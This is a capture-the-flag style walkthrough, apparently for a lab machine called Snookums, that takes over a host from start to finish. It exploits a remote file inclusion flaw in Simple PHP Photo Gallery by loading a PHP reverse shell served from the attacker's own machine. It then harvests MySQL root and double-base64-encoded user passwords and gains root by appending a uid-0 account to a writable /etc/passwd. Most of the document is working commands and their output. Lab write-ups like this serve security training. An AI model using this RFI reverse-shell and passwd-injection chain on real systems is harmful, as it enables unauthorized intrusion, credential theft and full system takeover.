_____

# Exploitation Guide for Snookums

## Summary

In this walkthrough, we will exploit an RFI vulnerability in the Simple PHP Photo Gallery web application, leveraging this to execute a remote PHP shell providing access to a low-level user account. We'll then discover and reuse recovered credentials to authenticate as root to the target's MySQL server. Next, we will discover, decode and reuse credentials once again, escalating to a user account that has write-access to /etc/passwd. We will then use this access to create a root-level user account.

## Enumeration

### Nmap

We’ll begin by running an `nmap` scan against all TCP ports:

```
kali@kali:~$ sudo nmap -p- 192.168.120.135
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 10:32 EDT
Nmap scan report for 192.168.120.135
Host is up (0.033s latency).
Not shown: 65527 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
33060/tcp open  mysqlx

Nmap done: 1 IP address (1 host up) scanned in 138.74 seconds
kali@kali:~$
```

### Web Enumeration

Browsing port 80 [(http://192.168.120.135/)](http://192.168.120.135/) reveals the following:

```
Simple PHP Photo Gallery v0.8
```

According to a Google search for "Simple PHP Photo Gallery" exploit, this software has a known RFI vulnerability: https://www.exploit-db.com/exploits/48424.

Although this server is running version 0.8, we will attempt this exploit, which executes a payload on a remote server. The payload address is passed as an argument to `/image.php?img=`.

Let's set up this exploit beginning with our payload.

## Exploitation

### Remote Code Execution

We will use `/usr/share/webshells/php/php-reverse-shell.php` as our payload, replacing lines 49 and 50 with our web server's IP address and the listening port that will catch our shell.

```
$ip = '192.168.118.3';  // CHANGE THIS
$port = 445;       // CHANGE THIS
```

Next, we'll start a python web server on port 80.

```
kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Let's set up a netcat listener on port 445 to catch the shell. Then, with everything in place, we'll run the exploit by browsing to [http://192.168.120.135/image.php?img=http://192.168.118.3/shell.php](http://192.168.120.135/image.php?img=http://192.168.118.3/shell.php), which executes and returns our reverse shell:

```
kali@kali:~$ sudo nc -lvp 445
listening on [any] 445 ...
192.168.120.135: inverse host lookup failed: Unknown host
connect to [192.168.118.3] from (UNKNOWN) [192.168.120.135] 46238
Linux snookums 3.10.0-1127.10.1.el7.x86_64 #1 SMP Wed Jun 3 14:28:03 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 10:59:07 up 2 min,  0 users,  load average: 0.07, 0.09, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
sh: no job control in this shell
sh-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
sh-4.2$
```

## Escalation

### MySQL Credentials Recovery

An inspection of the target reveals a useful **/var/www/html/db.php** file that contains MySQL root user credentials:

```
sh-4.2$ cd /var/www/html && ls -lah
cd /var/www/html && ls -lah
total 76K
drwxr-xr-x. 8 root root 4.0K Jun 10 10:54 .
drwxr-xr-x. 4 root root   33 Jun  9 10:17 ..
-rw-r--r--. 1 root root 4.0K Jun  8 13:46 README.txt
-rw-r--r--. 1 root root 1.7K Jun  8 13:46 UpgradeInstructions.txt
drwxr-xr-x. 2 root root   44 Jun 10 09:32 css
-rw-r--r--. 1 root root  146 Jun  8 14:45 db.php
-rw-r--r--. 1 root root 6.3K Jun  8 13:46 embeddedGallery.php
-rw-r--r--. 1 root root 2.1K Jun  8 13:46 functions.php
-rw-r--r--. 1 root root 4.5K Jun  8 13:57 image.php
drwxr-xr-x. 3 root root  225 Jun 10 09:32 images
-rw-r--r--. 1 root root 2.7K Jun 10 10:36 index.php
drwxr-xr-x. 2 root root  142 Jun 10 09:32 js
-rw-r--r--. 1 root root  19K Jun  8 13:46 license.txt
drwxr-xr-x. 2 root root    6 Jun 10 10:23 photos
-rw-r--r--. 1 root root 1.6K Jun  8 13:46 phpGalleryConfig.php
-rw-r--r--. 1 root root  619 Jun  8 13:46 phpGalleryStyle-RED.css
-rw-r--r--. 1 root root  509 Jun  8 13:46 phpGalleryStyle.css
drwxr-xr-x. 2 root root    6 Jun 10 09:31 phpGallery_images
drwxr-xr-x. 2 root root    6 Jun 10 09:31 phpGallery_thumbs
-rw-r--r--. 1 root root 2.6K Jun  8 13:46 thumbnail_generator.php
sh-4.2$ cat db.php
cat db.php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
define('DBNAME', 'SimplePHPGal');
?>
sh-4.2$
```

We can use these credentials to authenticate to the MySQL server on the target (via localhost).

### MySQL Database Enumeration

Before running the MySQL command line tool, we need to upgrade our shell:

```
sh-4.2$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
bash-4.2$
```

We can now connect to the database and enumerate further:

```
bash-4.2$ mysql -u root -p
mysql -u root -p
Enter password: MalapropDoffUtilize1337

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.20 MySQL Community Server - GPL

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> SHOW DATABASES;
SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| SimplePHPGal       |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> USE SimplePHPGal;
USE SimplePHPGal;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> SHOW TABLES;
SHOW TABLES;
+------------------------+
| Tables_in_SimplePHPGal |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.00 sec)

mysql> SELECT * FROM users;
SELECT * FROM users;
+----------+----------------------------------------------+
| username | password                                     |
+----------+----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
+----------+----------------------------------------------+
3 rows in set (0.00 sec)

mysql>
```

The `users` table in the `SimplePHPGal` database contains stored credentials for the `josh`, `Michael`, and `Serena` users. The passwords seem to be base64-encoded. Let's attempt to decode the credentials:

```
mysql> SELECT username, CONVERT(FROM_BASE64(password), CHAR) FROM users;
SELECT username, CONVERT(FROM_BASE64(password), CHAR) FROM users;
+----------+--------------------------------------+
| username | CONVERT(FROM_BASE64(password), CHAR) |
+----------+--------------------------------------+
| josh     | TW9iaWxpemVIaXNzU2VlZHRpbWU3NDc=     |
| michael  | SG9ja1N5ZG5leUNlcnRpZnkxMjM=         |
| serena   | T3ZlcmFsbENyZXN0TGVhbjAwMA==         |
+----------+--------------------------------------+
3 rows in set (0.01 sec)
```

The passwords appear to be double-encoded. Let's attempt to decode them one more time:

```
mysql> SELECT username, CONVERT(FROM_BASE64(FROM_BASE64(password)), CHAR) FROM users;
SELECT username, CONVERT(FROM_BASE64(FROM_BASE64(password)), CHAR) FROM users;
+----------+---------------------------------------------------+
| username | CONVERT(FROM_BASE64(FROM_BASE64(password)), CHAR) |
+----------+---------------------------------------------------+
| josh     | MobilizeHissSeedtime747                           |
| michael  | HockSydneyCertify123                              |
| serena   | OverallCrestLean000                               |
+----------+---------------------------------------------------+
3 rows in set (0.00 sec)

mysql>
```

The resulting cleartext passwords appear legitimate.

### SSH and Local Enumeration

Let's attempt to SSH into the target with the recovered credentials.

```
kali@kali:~$ ssh michael@192.168.120.135
michael@192.168.120.135's password: 
[michael@snookums ~]$ id
uid=1000(michael) gid=1000(michael) groups=1000(michael) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[michael@snookums ~]$
```

We successfully authenticated as michael, and it appears that this user can write to **/etc/passwd**:

```
[michael@snookums ~]$ ls -lah /etc/passwd
-rw-r--r--. 1 michael root 1.2K Jun  9 10:22 /etc/passwd
[michael@snookums ~]$
```

With this level of access, we should be able to add an arbitrary user to the `root` group.

### Adding New User

Let's generate the password hash for a user named `GitRekt` with a password of `pwn1337`:

```
kali@kali:~$ openssl passwd -1 -salt GitRekt pwn1337
$1$GitRekt$FzDARwVLdGr6swDMInZda1
kali@kali:~$
```

Next, we'll create a proper **/etc/passwd** entry, creating a user which is a member of the root group:

```
[michael@snookums ~]$ echo 'GitRekt:$1$GitRekt$FzDARwVLdGr6swDMInZda1:0:0::/root:/bin/bash' >> /etc/passwd
[michael@snookums ~]$ cat /etc/passwd | grep GitRekt
GitRekt:$1$GitRekt$FzDARwVLdGr6swDMInZda1:0:0::/root:/bin/bash
[michael@snookums ~]$
```

We can now SSH in as `GitRekt` to confirm root privilege on the system:

```
kali@kali:~$ ssh GitRekt@192.168.120.135
GitRekt@192.168.120.135's password: 
[root@snookums ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@snookums ~]#
```
